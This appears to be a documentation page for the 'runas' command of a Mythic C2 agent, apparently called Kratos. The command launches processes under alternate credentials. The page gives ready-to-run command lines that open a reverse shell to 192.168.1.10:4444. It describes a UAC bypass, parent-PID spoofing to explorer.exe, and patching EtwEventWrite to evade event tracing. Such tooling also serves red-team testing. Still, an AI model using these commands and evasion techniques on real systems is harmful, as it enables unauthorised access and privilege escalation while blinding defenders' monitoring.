+++
title = "runas"
chapter = false
weight = 5
+++

## Summary
Spawn a process under alternate credentials via `CreateProcessWithLogonW` (RunasCS-style). Captures stdout/stderr via anonymous pipes, or redirects to a remote host:port (-r).

Supports Mythic credential store or manual username/password input.

## Arguments
| Name | Required | Description |
|------|----------|-------------|
| `username` | Yes | DOMAIN\user, user@domain, or user |
| `password` | Yes | Plaintext password |
| `application` | Yes | Executable to run (default: cmd.exe) |
| `arguments` | No | Arguments passed to the application |
| `logon_type` | No | 2=Interactive, 3=Network, 4=Batch, 5=Service, 8=NetworkCleartext, 9=NewCredentials (default: 2) |
| `remote` | No | Redirect stdin/stdout/stderr to host:port (reverse shell). Leave empty to capture output locally. |
| `bypass_uac` | No | UAC bypass: impersonate a non-filtered token so seclogon spawns a high-IL process. Types 2/9 silently use NetworkCleartext (8) internally. |
| `ppid_spoof` | No | Spoof parent PID to explorer.exe. Types 3/4/5/8: PPID spoof + ETW patch. Types 2/9: ETW patch only (CreateProcessWithLogonW incompatible with PPID spoof). |

## Usage
Positional (CLI) :
```
runas user pass app [args] [-r host:port] [-l logon_type]
runas DOMAIN\user Password123! cmd.exe "/c whoami /all"
runas DOMAIN\user Password123! cmd.exe "/c whoami" -r 192.168.1.10:4444
runas DOMAIN\user Password123! cmd.exe -r 192.168.1.10:4444 -l 3
```

Named (popup / JSON) :
```
runas -username DOMAIN\user -password Password123! -application cmd.exe -arguments "/c whoami /all"
runas -username DOMAIN\user -password Password123! -logon_type "3 - Network" -application cmd.exe
runas -username DOMAIN\user -password Password123! -application cmd.exe -ppid_spoof true
runas DOMAIN\user Password123! cmd.exe -b
```

## Notes
- Types 2/9: `CreateProcessWithLogonW` (SecLogon service, no privileges needed on caller).
- Types 3/4/5/8: `LogonUser` + `DuplicateTokenEx` + `CreateProcess(SUSPENDED)` + `SetThreadToken` + `ResumeThread`. Requires `SeImpersonatePrivilege` on Kratos.
- Type 4 additionally requires `SeBatchLogonRight` on the target account.
- Type 5 additionally requires `SeServiceLogonRight` on the target account.
- Logon type 9 (NewCredentials): inherits local token, uses alternate credentials for network auth only.
- `-remote host:port`: connects to a TCP listener and gives the process a socket as stdin/stdout/stderr. Output not captured by Mythic.
- `bypass_uac`: `LogonUser` with a non-UAC-filtered type (3/4/5/8) + copy IL + strip DACL + `ImpersonateLoggedOnUser` + `CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY)`. **Requires direct `LogonUser` network calls to succeed.** Fails with err 1326 on hardened Windows 10/11 where LSA restricts network logon types to SYSTEM/SecLogon only - same limitation as RunasCS `--bypass-uac`. Works on domain-joined machines or less-restricted configs.
- `ppid_spoof`: for types 3/4/5/8, spawns suspended via `CreateProcessW` with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` set to explorer.exe, then patches `EtwEventWrite` before resume. For types 2/9, `CreateProcessWithLogonW` is incompatible with attribute lists, so only ETW patch is applied.
